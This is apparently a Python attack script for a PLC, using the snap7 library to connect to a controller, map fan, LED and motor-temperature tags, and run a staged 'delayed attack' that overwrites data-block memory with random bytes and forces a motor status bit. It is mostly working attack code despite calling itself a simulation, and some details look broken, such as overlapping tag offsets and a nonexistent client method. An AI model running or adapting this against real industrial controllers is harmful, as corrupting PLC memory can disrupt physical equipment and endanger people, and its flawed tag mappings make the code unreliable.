import snap7
import time
import random

# Configuration
PLC_IP = '127.0.0.1'  # Replace with the actual PLC IP address if known
RACK = 0
SLOT = 1
DB_NUMBER = 1  # Assuming data is primarily in DB1 - Adjust if necessary
DB_START = 0
DB_SIZE = 20  # Adjust based on the size of the data to be read/written

# Tag definitions based on provided table (partial list for demonstration)
#  Offsets and data types must be accurate to avoid errors.
TAGS = {
    "Fan_A": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 0},  # %Q0.0
    "Fan_B": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 1},  # %Q0.1
    "Fan_A_Red": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 4}, # %Q0.4
    "Fan_A_Green": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 5}, # %Q0.5
    "Fan_B_Red": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 2}, # %Q0.2
    "Fan_B_Green": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 3}, # %Q0.3
    "Activate_Fan_A": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 0},  # %M0.0
    "Activate_Fan_B": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 1},  # %M0.1
    "Master_Fan_B_HMI": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 5}, # %M0.5
    "Motor_Temp": {"address": 7, "data_type": "INT", "byte_offset": 0, "bit_offset": 0},  # %MW7
    "Overheating_Check": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 2}, # %M0.2
    "Tag_2": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 4},  # %M0.4
    "Motor_Status_GET": {"address": 0, "data_type": "BOOL", "byte_offset": 0, "bit_offset": 6},  # %Q0.6
}


def find_plc_ip():  # Placeholder - Replace with actual discovery method
    """
    Placeholder function to simulate discovering the PLC's IP address.
    In a real-world scenario, you'd use network scanning or configuration files.
    """
    print("Attempting to discover PLC IP address...")
    # Simulate a successful discovery
    #  Replace this with actual discovery code
    time.sleep(2)  # Simulate discovery time
    print("PLC IP address discovered: 127.0.0.1 (Simulated)") # Replace with actual code to find IP, if necessary.
    return "127.0.0.1" #Replace with actual code to find IP, if necessary.

def read_plc_data(plc, db_number, start, size):
    """Reads a block of data from the PLC."""
    try:
        data = plc.db_read(db_number, start, size)
        return data
    except Exception as e:
        print(f"Error reading PLC data: {e}")
        return None

def write_plc_data(plc, db_number, start, size, data):
    """Writes a block of data to the PLC."""
    try:
        plc.db_write(db_number, start, size, data)
        return True
    except Exception as e:
        print(f"Error writing PLC data: {e}")
        return False

def tamper_firmware(plc, tag_name):
    """
    Simulates a firmware modification attack by writing random data to a critical memory area.
    This is a simplified example and would need to be adapted to a real attack scenario.
    """
    # Target specific memory area (e.g., starting from MB100) - ADJUST TO YOUR PLC'S MEMORY MAP
    start_address = 100
    size = 10  # Size of the memory area to overwrite
    print(f"Simulating firmware tampering: Overwriting memory starting at MB{start_address} with {size} bytes of random data.")

    # Generate random data
    random_data = bytearray(random.getrandbits(8) for _ in range(size))

    # Write the random data to the PLC
    if write_plc_data(plc, DB_NUMBER, start_address, size, bytes(random_data)):  # Use DB_NUMBER for consistency
        print("Firmware tampering simulation successful.")
    else:
        print("Firmware tampering simulation failed.")

    # Optionally, trigger a fault or error condition to simulate bricking the Ethernet card
    # This could involve writing specific values to control registers, etc.
    print("Simulating a potential system fault...")
    # Example: Set the Motor_Status_GET to a high value to simulate an error.
    set_tag_value(plc, "Motor_Status_GET", True)


def set_tag_value(plc, tag_name, value):
    """Sets the value of a specific tag in the PLC."""
    if tag_name not in TAGS:
        print(f"Error: Tag '{tag_name}' not found in TAGS.")
        return False

    tag_info = TAGS[tag_name]
    address = tag_info["address"]
    data_type = tag_info["data_type"]
    byte_offset = tag_info["byte_offset"]
    bit_offset = tag_info["bit_offset"]

    # Read the current DB data
    db_data = read_plc_data(plc, DB_NUMBER, DB_START, DB_SIZE)
    if db_data is None:
        return False

    # Modify the relevant byte based on the tag's bit offset
    byte_index = byte_offset
    current_byte = db_data[byte_index]

    if data_type == "BOOL":
        if value:
            new_byte = current_byte | (1 << bit_offset)  # Set the bit
        else:
            new_byte = current_byte & ~(1 << bit_offset)  # Clear the bit

        db_data = bytearray(db_data)  # Convert to bytearray for modification
        db_data[byte_index] = new_byte

    elif data_type == "INT":
        # Assumes 16-bit integer (2 bytes).
        value_bytes = value.to_bytes(2, 'big')  # Convert the int to 2 bytes
        db_data = bytearray(db_data)
        db_data[byte_offset] = value_bytes[0] #Most significant byte
        db_data[byte_offset + 1] = value_bytes[1] #Least significant byte


    else:
        print(f"Unsupported data type: {data_type}")
        return False

    # Write the modified data back to the PLC
    if write_plc_data(plc, DB_NUMBER, DB_START, DB_SIZE, bytes(db_data)):
        print(f"Tag '{tag_name}' set to {value} successfully.")
        return True
    else:
        print(f"Failed to set tag '{tag_name}' to {value}.")
        return False


def main():
    plc_ip = find_plc_ip()  # Discover PLC IP address (or use a static IP)

    # Initialize the PLC client
    plc = snap7.client.Client()
    plc.set_as_string(False)

    try:
        plc.connect(plc_ip, RACK, SLOT)
        print(f"Connected to PLC at {plc_ip}")

        # Simulate delayed attack: Stage the attack
        print("Staging delayed attack...")
        time.sleep(5)  # Wait for a period before launching the attack

        # Launch the attack (simulate firmware modification)
        tamper_firmware(plc, "Motor_Temp")

        print("Attack launched.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")

if __name__ == "__main__":
    main()